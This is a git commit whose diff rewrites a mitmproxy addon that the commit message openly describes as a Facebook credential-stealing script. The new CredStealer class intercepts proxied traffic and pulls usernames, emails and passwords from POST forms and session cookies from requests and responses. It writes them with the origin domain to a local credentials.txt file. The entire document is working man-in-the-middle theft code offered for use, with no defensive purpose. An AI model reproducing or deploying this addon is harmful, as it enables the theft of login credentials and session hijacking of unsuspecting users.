ac167115f635f203dafc3ed05729974ab95ab327
Jordan <kungfusnake@gmail.com>
2022-04-14 01:58:42 -0700

    Credentials Stealing Script for Facebook
    - Functionality for stealing facebook credentials

--- credentials.py
+++ credentials.py
@@ -1,27 +1,48 @@
 from mitmproxy import http
 from datetime import datetime
 
-creds_dict = {}
 
-def request(flow: http.HTTPFlow):
+class CredStealer:
+    creds_dict = []
     cred_text = open("credentials.txt", "a")
-    now = datetime.now()
-    cred_text.write(f"Stealing Credentials Time: {now}\n")
 
-    text = flow.request.text.split("=")
-    if flow.request.method == "POST":
-        for i in range(0, len(text) - 1, 1):
-            item = text[i]
-            next = text[i + 1]
-            if ("encpass" in item) or ("pass" in item) or ("user" in item) or ("cred" in item):
-                if next not in creds_dict:
-                    cred_text.write(f"{item}={next}\n")
-                    creds_dict[next] = 0
-    else:
-        for i in range(0, len(text) - 1, 1):
-            item = text[i]
-            next = text[i + 1]
-            if ("sess" in item) or ("cookie" in item):
-                if next not in creds_dict:
-                    cred_text.write(f"{item}={next}\n")
-                    creds_dict[next] = 0
+    def load(self, loader):
+        now = datetime.now()
+        self.cred_text.write(f"\nStealing Credentials Time: {now}\n")
+        self.cred_text.close()
+
+    def request(self, flow: http.HTTPFlow):
+        self.cred_text = open("credentials.txt", "a")
+
+    def response(self, flow: http.HTTPFlow):
+        self.cred_text = open("credentials.txt", "a")
+        if flow.request.method == "POST" and flow.response != None:
+            form_data = flow.request.urlencoded_form
+            origin = flow.request.headers["origin"]
+            user = None
+            pswd = None
+            for key, value in form_data.items():
+                if "pass" in key:
+                    pswd = value
+                elif ("email" in key) or ("user" in key):
+                    user = value
+            if user != None and pswd != None and (user, pswd) not in self.creds_dict:
+                self.cred_text.write(f"Domain: {origin}\n")
+                self.cred_text.write(f"User: {user}\nPassword: {pswd}\n")
+                self.creds_dict.append((user, pswd))
+
+        request_cookies = flow.request.cookies.items()
+        response_cookies = flow.response.cookies.items()
+        for key, value in request_cookies:
+            if (key, value) not in self.creds_dict and ("sess" in key):
+                self.cred_text.write(f"Possible session: {value}\n")
+                self.creds_dict.append((user, pswd))
+        for key, value in response_cookies:
+            if (key, value) not in self.creds_dict and ("sess" in key):
+                self.cred_text.write(f"Possible session: {value}\n")
+                self.creds_dict.append((user, pswd))
+
+
+addons = [
+    CredStealer()
+]
